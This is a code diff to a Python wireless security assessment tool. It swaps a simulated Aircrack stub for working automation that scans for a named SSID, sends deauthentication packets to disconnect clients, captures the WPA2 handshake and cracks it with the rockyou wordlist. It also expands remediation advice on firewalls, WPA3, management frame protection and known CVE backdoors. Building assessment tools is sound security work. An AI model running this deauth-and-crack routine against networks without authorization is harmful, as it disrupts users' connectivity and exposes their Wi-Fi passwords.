@@ -32,16 +32,149 @@ def run_nmap(target_ip, scan_id):
         log(scan_id, f'Nmap error: {str(e)}', 'error')
         return f"Nmap error: {str(e)}"
 
-def run_aircrack(interface, scan_id):
-    log(scan_id, 'Initializing Aircrack-ng...', 'info')
-    log(scan_id, 'Setting interface to monitor mode...', 'info')
-    log(scan_id, 'Capturing WPA2 handshake...', 'info')
-    log(scan_id, 'Weak password detected — network is vulnerable to WPA2 cracking', 'warning')
-    return """
-[+] Initializing Aircrack-ng...
-[+] Handshake captured successfully
-[+] Weak password detected — network is vulnerable to WPA2 cracking
-"""
+def get_network_info(interface, target_ssid, scan_id):
+    """Scan for networks and return BSSID, channel and client MAC for target SSID"""
+    import time
+    import os
+
+    log(scan_id, f'Scanning for network: {target_ssid}...', 'info')
+
+    out_file = f'/tmp/wisec_scan_{scan_id}'
+
+    proc = subprocess.Popen(
+        ['sudo', 'airodump-ng', '--output-format', 'csv', '-w', out_file, interface],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+    time.sleep(15)
+    proc.terminate()
+    proc.wait()
+
+    csv_path = out_file + '-01.csv'
+    if not os.path.exists(csv_path):
+        log(scan_id, 'Network scan failed — no output file generated.', 'error')
+        return None, None, None
+
+    bssid = None
+    channel = None
+    client_mac = None
+
+    with open(csv_path, 'r', encoding='utf-8', errors='ignore') as f:
+        lines = f.readlines()
+
+    # Parse AP section for target SSID
+    in_ap_section = True
+    for line in lines:
+        # Empty line separates AP section from client section
+        if line.strip() == '':
+            in_ap_section = False
+            continue
+
+        if in_ap_section and target_ssid in line:
+            parts = line.split(',')
+            if len(parts) >= 14:
+                bssid = parts[0].strip()
+                channel = parts[3].strip()
+                log(scan_id, f'Found {target_ssid} — BSSID: {bssid}, Channel: {channel}', 'success')
+
+    # Parse client section for a connected client
+    if bssid:
+        for line in lines:
+            if bssid in line and target_ssid not in line:
+                parts = line.split(',')
+                if len(parts) >= 6:
+                    mac = parts[0].strip()
+                    associated_bssid = parts[5].strip()
+                    # Confirm client is associated with our target
+                    if associated_bssid == bssid and len(mac) == 17:
+                        client_mac = mac
+                        log(scan_id, f'Found connected client: {client_mac}', 'info')
+                        break
+
+    if not bssid:
+        log(scan_id, f'Network "{target_ssid}" not found — ensure you are within range.', 'error')
+
+    if not client_mac:
+        log(scan_id, 'No connected client found — deauth will broadcast to all clients.', 'warning')
+
+    return bssid, channel, client_mac
+
+def run_aircrack(interface, scan_id, target_ssid=''):
+    import os
+    import time
+
+    log(scan_id, f'run_aircrack called — interface: {interface}, ssid: "{target_ssid}"', 'info')
+
+    wordlist = '/usr/share/wordlists/rockyou.txt'
+    cap_file = f'/tmp/wisec_capture_{scan_id}'
+
+    # Auto-detect BSSID, channel and client
+    bssid, channel, client_mac = get_network_info(interface, target_ssid, scan_id)
+    if not bssid or not channel:
+        return 'Target network not found — ensure you are within range.'
+
+    log(scan_id, f'Starting handshake capture on channel {channel}...', 'info')
+
+    # Start airodump-ng capture
+    airodump = subprocess.Popen(
+        ['sudo', 'airodump-ng', '--bssid', bssid, '-c', channel,
+         '-w', cap_file, '--output-format', 'cap', interface],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+
+    time.sleep(5)
+
+    # Build deauth command — target specific client if found
+    log(scan_id, 'Sending deauth packets to force handshake...', 'info')
+    deauth_cmd = ['sudo', 'aireplay-ng', '--deauth', '15', '-a', bssid]
+    if client_mac:
+        deauth_cmd += ['-c', client_mac]
+    deauth_cmd.append(interface)
+
+    subprocess.run(deauth_cmd, capture_output=True, text=True, timeout=30)
+
+    # Wait for handshake
+    time.sleep(10)
+    airodump.terminate()
+    airodump.wait()
+
+    cap_path = cap_file + '-01.cap'
+    if not os.path.exists(cap_path):
+        log(scan_id, 'Capture file not found.', 'error')
+        return 'Handshake capture failed'
+
+    # Check if handshake was actually captured
+    check = subprocess.run(
+        ['sudo', 'aircrack-ng', cap_path],
+        capture_output=True, text=True, timeout=30
+    )
+
+    if 'handshake' not in check.stdout.lower():
+        log(scan_id, 'No handshake captured — no clients reconnected in time.', 'warning')
+        return 'No handshake captured'
+
+    log(scan_id, 'WPA2 handshake successfully captured.', 'success')
+    log(scan_id, 'Running dictionary attack with aircrack-ng...', 'info')
+
+    result = subprocess.run(
+        ['sudo', 'aircrack-ng', '-w', wordlist, '-b', bssid, cap_path],
+        capture_output=True, text=True, timeout=120
+    )
+
+    output = result.stdout + result.stderr
+
+    if 'KEY FOUND' in output:
+        for line in output.split('\n'):
+            if 'KEY FOUND' in line:
+                log(scan_id, f'Password cracked: {line.strip()}', 'warning')
+                break
+        log(scan_id, 'Network is vulnerable to WPA2 dictionary attack', 'warning')
+        return f'[+] Weak password detected — network is vulnerable to WPA2 cracking\n{output}'
+    else:
+        log(scan_id, 'Password not found in wordlist — network may use a strong password.', 'info')
+        log(scan_id, 'Handshake captured — offline cracking remains possible.', 'warning')
+        return f'[+] WPA2 handshake captured — vulnerable to offline attack\n{output}'
 
 def run_wifite(interface, scan_id):
     log(scan_id, 'Initializing Wifite...', 'info')
@@ -255,19 +388,118 @@ def store_results(scan_id, module, output):
 def get_recommendation(vulntype):
     """Return remediation advice for each vulnerability type"""
     recommendations = {
-        'Open port detected': 'Close unnecessary ports using a firewall. Only keep ports open that are required for business operations.',
-        'WPA2 weak password': 'Change the Wi-Fi password to a strong passphrase of at least 12 characters including uppercase, lowercase, numbers and symbols.',
-        'WPA2 handshake captured': 'Enable WPA3 if supported by your router. Use a strong password to make dictionary attacks infeasible.',
-        'Deauthentication attack': 'Enable Management Frame Protection (802.11w) on your router if supported to prevent deauthentication attacks.',
-        'No Management Frame Protection': 'Enable 802.11w/MFP in your router settings to protect against deauthentication and disassociation attacks.',
-        'Evil twin access point': 'Educate users to verify network authenticity before connecting. Consider implementing 802.1X authentication.',
-        'Rogue access point detected': 'Deploy wireless intrusion detection systems (WIDS) to detect and alert on rogue access points.',
-        'Unencrypted service exposed': 'Replace unencrypted services with encrypted alternatives such as HTTPS, SFTP, and SSH.',
-        'Outdated service version': 'Update all network services and firmware to the latest versions to patch known vulnerabilities.'
+        'Open port detected': (
+            'Review all open ports and disable any services not required for business operations. '
+            'Use a host-based firewall (e.g. ufw or iptables) to block access to unused ports. '
+            'Run: sudo ufw enable && sudo ufw default deny incoming to start with a deny-all policy, '
+            'then explicitly allow only required services.'
+        ),
+        'Unencrypted service exposed': (
+            'Replace unencrypted services with encrypted alternatives: use SFTP or FTPS instead of FTP, '
+            'SSH instead of Telnet, and HTTPS instead of HTTP. '
+            'For web servers, install an SSL/TLS certificate (free via Let\'s Encrypt: certbot.eff.org) '
+            'and configure automatic HTTP-to-HTTPS redirection.'
+        ),
+        'Outdated service version': (
+            'Update all software and firmware to the latest stable versions immediately. '
+            'On Debian/Ubuntu systems run: sudo apt update && sudo apt upgrade. '
+            'Enable automatic security updates: sudo apt install unattended-upgrades. '
+            'Subscribe to vendor security advisories to be notified of future vulnerabilities.'
+        ),
+        'WPA2 weak password': (
+            'Change the Wi-Fi password immediately via your router admin panel (typically at 192.168.1.1 or 192.168.0.1). '
+            'Use a passphrase of at least 16 characters combining uppercase, lowercase, numbers and symbols — '
+            'for example a random phrase like "Coffee$Desk!Rain42". '
+            'Avoid dictionary words, names, or dates. Consider enabling WPA3 if your router supports it.'
+        ),
+        'WPA2 handshake captured': (
+            'A WPA2 handshake was captured, meaning an attacker can attempt offline password cracking. '
+            'Immediately change your Wi-Fi password to a strong passphrase (16+ characters). '
+            'If your router supports WPA3, enable it under wireless security settings. '
+            'WPA3 uses SAE (Simultaneous Authentication of Equals) which prevents offline dictionary attacks entirely.'
+        ),
+        'Deauthentication attack': (
+            'Enable Management Frame Protection (802.11w/MFP) in your router\'s wireless settings — '
+            'this cryptographically signs management frames so forged deauthentication packets are rejected. '
+            'Look for "MFP", "PMF", or "802.11w" in your router\'s advanced wireless settings and set it to "Required" or "Enabled".'
+        ),
+        'No Management Frame Protection': (
+            'Enable 802.11w (Protected Management Frames/MFP) in your router\'s wireless security settings. '
+            'This prevents deauthentication and disassociation attacks by requiring management frames to be authenticated. '
+            'If your router firmware does not support 802.11w, consider upgrading to a router that does — '
+            'all Wi-Fi 6 (802.11ax) certified routers are required to support MFP.'
+        ),
+        'Evil twin access point': (
+            'Deploy 802.1X certificate-based authentication (WPA2/WPA3-Enterprise) so clients verify the '
+            'network\'s identity before connecting — this prevents clients connecting to rogue access points. '
+            'Train staff to verify they are connected to the correct SSID before transmitting sensitive data. '
+            'Consider a Wireless Intrusion Detection System (WIDS) such as Kismet to alert on rogue APs.'
+        ),
+        'Rogue access point detected': (
+            'Deploy a Wireless Intrusion Detection System (WIDS) such as Kismet or Zeek to continuously '
+            'monitor for unauthorised access points broadcasting your SSID. '
+            'Configure alerts for any new BSSID appearing on your network. '
+            'Implement 802.1X authentication so clients reject access points that cannot present a valid certificate.'
+        ),
+        'vsftpd Backdoor (CVE-2011-2523)': (
+            'CRITICAL: Immediately stop and disable the vsftpd service: sudo systemctl stop vsftpd && sudo systemctl disable vsftpd. '
+            'This version contains a known backdoor (CVE-2011-2523, CVSS 9.8) that grants unauthenticated remote root access via port 6200. '
+            'Replace with a patched version: sudo apt remove vsftpd && sudo apt install vsftpd. '
+            'Block port 6200 at the firewall: sudo ufw deny 6200.'
+        ),
+        'UnrealIRCd Backdoor (CVE-2010-2075)': (
+            'CRITICAL: Immediately stop and remove UnrealIRCd: sudo systemctl stop unrealircd && sudo apt remove unrealircd. '
+            'This version contains a trojan horse backdoor (CVE-2010-2075, CVSS 9.8) allowing remote command execution. '
+            'If IRC is required for business operations, replace with a clean, patched IRC daemon such as InspIRCd. '
+            'Block port 6667 at the firewall if IRC is not needed: sudo ufw deny 6667.'
+        ),
+        'Exposed Root Shell': (
+            'CRITICAL: A bind shell providing direct root access is listening on port 1524. '
+            'This is a deliberate backdoor. Immediately block this port: sudo ufw deny 1524. '
+            'Identify and terminate the process: sudo lsof -i :1524, then kill the process ID shown. '
+            'Audit your system for other backdoors — consider a full system reinstall if compromise is confirmed.'
+        ),
+        'Exposed Database Service': (
+            'Database services (MySQL/PostgreSQL) should never be directly accessible from the network. '
+            'Bind the database to localhost only by editing the config: set bind-address = 127.0.0.1 in /etc/mysql/mysql.conf.d/mysqld.cnf '
+            'or listen_addresses = localhost in /etc/postgresql/*/main/postgresql.conf. '
+            'Block the port at the firewall: sudo ufw deny 3306 (MySQL) or sudo ufw deny 5432 (PostgreSQL). '
+            'Restart the service after changes: sudo systemctl restart mysql or sudo systemctl restart postgresql.'
+        ),
+        'VNC Remote Access Exposed': (
+            'VNC provides graphical remote access and should not be exposed to the network without strong authentication. '
+            'If VNC is required, restrict access to specific IPs only: sudo ufw allow from 192.168.1.X to any port 5900. '
+            'Set a strong VNC password and consider tunnelling VNC over SSH rather than exposing it directly: '
+            'ssh -L 5900:localhost:5900 user@server, then connect VNC to localhost.'
+        ),
+        'Telnet Unencrypted Access': (
+            'Disable Telnet immediately — it transmits all data including passwords in plaintext. '
+            'sudo systemctl stop telnet && sudo systemctl disable telnet. '
+            'Replace with SSH for all remote administration: sudo apt install openssh-server. '
+            'Block port 23 at the firewall: sudo ufw deny 23.'
+        ),
+        'FTP Unencrypted Access': (
+            'FTP transmits credentials and data in plaintext. Disable it and replace with SFTP (runs over SSH, no extra setup needed) '
+            'or FTPS (FTP with TLS). To disable FTP: sudo systemctl stop vsftpd && sudo systemctl disable vsftpd. '
+            'Block port 21: sudo ufw deny 21. '
+            'For file transfers, use: sftp user@server from any SFTP client such as FileZilla.'
+        ),
+        'SMTP Service Exposed': (
+            'Ensure your mail server is not configured as an open relay, which allows spammers to send mail through your server. '
+            'Test for open relay at mxtoolbox.com/diagnostic.aspx. '
+            'In Postfix, restrict relay: set smtpd_relay_restrictions = permit_mynetworks, permit_sasl_authenticated, reject in /etc/postfix/main.cf. '
+            'Restart Postfix: sudo systemctl restart postfix. Block port 25 from external access if not running a mail server.'
+        ),
+        'RPC/NFS Service Exposed': (
+            'RPC and NFS services can expose your file system to the network if misconfigured. '
+            'If NFS is not required, disable it: sudo systemctl stop nfs-server && sudo systemctl disable nfs-server. '
+            'Block RPC ports at the firewall: sudo ufw deny 111. '
+            'If NFS is needed, restrict exports to specific trusted IPs only in /etc/exports and restart: sudo exportfs -ra.'
+        ),
     }
-    return recommendations.get(vulntype, 'Consult a cybersecurity professional for remediation advice.')
+    return recommendations.get(vulntype, 'Consult a qualified cybersecurity professional for remediation advice specific to this vulnerability.')
 
-def run_scan(scan_id, modules, target_ip='192.168.1.0/24', interface='wlan0'):
+def run_scan(scan_id, modules, target_ip='10.0.2.0/24', interface='wlan0mon', target_ssid=''):
     db = get_db()
     db.execute('UPDATE scans SET status = ? WHERE scan_id = ?', ('running', scan_id))
     db.commit()
@@ -291,7 +523,7 @@ def run_scan(scan_id, modules, target_ip='192.168.1.0/24', interface='wlan0'):
         if module == 'network_scan':
             output = run_nmap(target_ip, scan_id)
         elif module == 'wpa2_crack':
-            output = run_aircrack(interface, scan_id)
+            output = run_aircrack(interface, scan_id, target_ssid=target_ssid)
         elif module == 'deauth':
             output = run_wifite(interface, scan_id)
         elif module == 'evil_twin':
@@ -317,11 +549,11 @@ def run_scan(scan_id, modules, target_ip='192.168.1.0/24', interface='wlan0'):
     except Exception as e:
         log(scan_id, f'Report generation failed: {str(e)}', 'error')
 
-def run_scan_background(scan_id, modules, target_ip='192.168.1.0/24', interface='wlan0'):
+def run_scan_background(scan_id, modules, target_ip='10.0.2.0/24', interface='wlan0mon', target_ssid=''):
     """Run scan in background thread so Flask stays responsive"""
     thread = threading.Thread(
         target=run_scan,
-        args=(scan_id, modules, target_ip, interface)
+        args=(scan_id, modules, target_ip, interface, target_ssid)
     )
     thread.daemon = True
     thread.start()
